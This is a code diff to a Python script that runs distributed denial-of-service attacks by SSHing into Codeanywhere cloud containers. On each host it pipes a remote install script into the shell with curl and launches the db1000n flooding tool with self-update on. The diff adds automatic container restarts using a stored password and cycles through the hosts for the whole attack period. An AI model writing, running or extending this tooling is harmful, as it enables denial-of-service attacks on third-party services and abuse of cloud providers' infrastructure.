@@ -11,12 +11,17 @@ import subprocess
 import sys
 import time
 
+from utils.caw_restart import restart
+
+MSG_FORMAT = '%(asctime)s:%(levelname)s: %(message)s'
+
 logging.getLogger().setLevel(logging.INFO)
+logging.basicConfig(format=MSG_FORMAT)
 
 CAW_KEYS_DIR = f'caw_keys{os.sep}'
 
 ATTACK_COMMAND = (
-    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{user}_{host}_{port} {user}@{host} -p {port} '
+    'ssh -o StrictHostKeyChecking=no -i {caw_keys_dir}{email}__{host}__{port} cabox@{host} -p {port} '
     '-t "source <(curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh) '
     '&& ./db1000n -enable-self-update -prometheus_on=false {needles_args}"'
 )
@@ -29,8 +34,9 @@ class Attack:
     """
 
     def __init__(self):
-        self.configurations = iter([])
+        self.configurations = []
         self.shells_num = 0
+        self.iter_configurations = iter([])
         self.processes = []
 
     def make_hosts(self, shells_num):
@@ -40,12 +46,12 @@ class Attack:
         :param shells_num: a number of ssh connections
 
         """
-        configurations = next(os.walk(CAW_KEYS_DIR))[-1]
+        self.configurations = next(os.walk(CAW_KEYS_DIR))[-1]
 
-        if configurations:
-            logging.info('codeanywhere hosts: %s', ", ".join(configurations))
-            self.configurations = iter(configurations)
-            self.shells_num = min(len(configurations), shells_num)
+        if self.configurations:
+            logging.info('codeanywhere hosts: %s', ", ".join(self.configurations))
+            self.shells_num = min(len(self.configurations), shells_num)
+            self.iter_configurations = iter(self.configurations)
         else:
             logging.warning('there is no codeanywhere host')
 
@@ -56,15 +62,25 @@ class Attack:
         :param needles_args: db1000n arguments
 
         """
-        configuration = next(self.configurations, None)
+        configuration = next(self.iter_configurations, None)
+
+        if configuration is None and self.configurations:
+            self.iter_configurations = iter(self.configurations)
+
         if configuration:
             os.makedirs('logs', exist_ok=True)
-            user, host, port = configuration.split('_')
-            with open(f'logs{os.sep}codeanywhere_{configuration}.log', 'w') as log:
+            email, host, port = configuration.split('__')
+
+            try:
+                restart(email, os.environ['CAW_PASSWORD'])
+            except Exception as e:
+                logging.error('container was not restarted: %s', e)
+
+            with open(f'logs{os.sep}caw__{configuration}.log', 'w') as log:
                 process = subprocess.Popen(
                     shlex.split(ATTACK_COMMAND.format(
                         caw_keys_dir=CAW_KEYS_DIR,
-                        user=user,
+                        email=email,
                         host=host,
                         port=port,
                         needles_args=needles_args
@@ -124,6 +140,10 @@ def main():
         logging.info('press ctrl+c to stop attack')
         while (time.time() - start_time) < args.attack_time:
             attack.make_hosts(args.shells_num)
+
+            if not attack.configurations:
+                sys.exit()
+
             attack.start(args.needles_args)
 
     except KeyboardInterrupt:
